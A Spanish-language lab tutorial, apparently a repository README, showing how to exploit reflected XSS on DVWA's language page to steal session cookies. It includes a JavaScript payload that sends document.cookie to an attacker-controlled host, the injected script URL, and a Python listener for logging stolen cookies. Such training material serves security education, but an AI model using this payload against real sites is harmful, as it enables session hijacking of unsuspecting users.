# Explotación XSS Reflejado de Nivel Bajo para Robo de Cookies

Este repositorio contiene los archivos y la explicación para realizar una explotación de Cross-Site Scripting (XSS) reflejado de nivel bajo con el objetivo de robar cookies de sesión. Este ejemplo se enfoca en la página de selección de idioma de la aplicación web vulnerable DVWA (Damn Vulnerable Web Application).

**Advertencia:** Esta información se proporciona únicamente con fines educativos y de prueba de penetración en entornos controlados. El uso de estas técnicas sin permiso explícito es ilegal y puede tener consecuencias graves.

## Herramientas Necesarias

* **Navegador web:** Para acceder a la página vulnerable y verificar la explotación.
* **Kali Linux (o cualquier sistema con Python instalado):** Necesario para levantar un servidor web temporal y analizar los logs.
* **Acceso a la página web vulnerable:** En este caso, la página de selección de idioma de DVWA.

## Pasos para la Explotación

1.  **Levantar un Servidor Web Temporal en Kali:**
    Abre una terminal en tu máquina Kali Linux y ejecuta el siguiente comando para iniciar un servidor web simple en el puerto 9999:
    ```bash
    python -m SimpleHTTPServer 9999
    ```
    Mantén esta terminal abierta para registrar las peticiones entrantes.

2.  **Crear el Payload en un Archivo JavaScript (`a.js`):**
    Crea un nuevo archivo de texto llamado `a.js` en el directorio desde donde ejecutaste el comando `SimpleHTTPServer`. Pega el siguiente código JavaScript dentro del archivo, reemplazando `[tu_IP_de_Kali]` con la dirección IP de tu máquina Kali Linux (puedes encontrarla con `ifconfig` o `ip addr`):
    ```javascript
    function getimg() {
      var img = document.createElement('img');
      img.src = 'http://[tu_IP_de_Kali]:9999/' + document.cookie;
      document.body.appendChild(img);
    }

    getimg();
    ```
    Guarda el archivo `a.js`.

3.  **Construir la URL Maliciosa:**
    Identifica la URL vulnerable. Para el nivel bajo de XSS reflejado en la página de selección de idioma de DVWA, la URL base es similar a:
    ```
    http://dvwa/dvwa/vulnerabilities/xss_d/
    ```
    Modifica el parámetro `default` en la URL para inyectar la etiqueta `<script>` que carga tu archivo `a.js` desde tu servidor web temporal. La URL final debería tener la siguiente estructura (asegúrate de reemplazar `[tu_IP_de_Kali]` con tu IP):
    ```
    http://dvwa/dvwa/vulnerabilities/xss_d/?default=<script src="http://[tu_IP_de_Kali]:9999/a.js"></script>
    ```

4.  **Enviar la URL Maliciosa a la Víctima (o Acceder a Ella):**
    Para probar la explotación, puedes simplemente pegar la URL modificada en la barra de direcciones de tu propio navegador web (si estás probando en un entorno local con DVWA configurado). En un escenario real, un atacante podría emplear diversas técnicas de ingeniería social para que la víctima acceda a este enlace.

5.  **Verificar los Logs del Servidor Web Temporal:**
    Regresa a la terminal donde está ejecutándose tu servidor web en Kali. Si la explotación es exitosa, verás una o más peticiones HTTP en los logs del servidor. Busca una petición `GET` que contenga la cookie de la víctima en la URL solicitada. Debería verse algo parecido a:
    ```
    [timestamp] "GET /[COOKIE_DE_LA_VICTIMA] HTTP/1.1" 404 -
    ```
    La parte `[COOKIE_DE_LA_VICTIMA]` representa la cookie de sesión del usuario que accedió a la URL maliciosa. ¡La cookie ha sido robada!

## Explicación de lo que Sucede

1.  Cuando la víctima hace clic en el enlace malicioso o accede a la URL, el navegador web interpreta la etiqueta `<script>` inyectada en el parámetro `default`.
2.  Esto provoca que el navegador realice una petición HTTP al servidor web temporal que configuraste en Kali (en el puerto 9999) para obtener el archivo `a.js`.
3.  Tu servidor web en Kali responde sirviendo el contenido del archivo `a.js`.
4.  El código JavaScript dentro de `a.js` se ejecuta en el contexto del navegador de la víctima.
5.  La función `getimg()` crea dinámicamente un nuevo elemento `<img>`.
6.  La propiedad `src` de esta imagen se establece a una URL en tu servidor web de Kali, anexando el valor de `document.cookie` (que contiene las cookies del sitio web actual de la víctima) como parte de la ruta de la "imagen".
7.  El navegador de la víctima intenta cargar esta "imagen" desde tu servidor web en Kali.
8.  La petición HTTP enviada por el navegador de la víctima a tu servidor web incluye la cookie robada en la URL solicitada, la cual queda registrada en los logs de tu servidor web temporal.

Este ejemplo ilustra una vulnerabilidad XSS reflejada básica y cómo un atacante puede explotarla para robar información sensible como las cookies de sesión. En escenarios reales, las consecuencias de un robo de cookies pueden ser graves, permitiendo al atacante hacerse pasar por la víctima.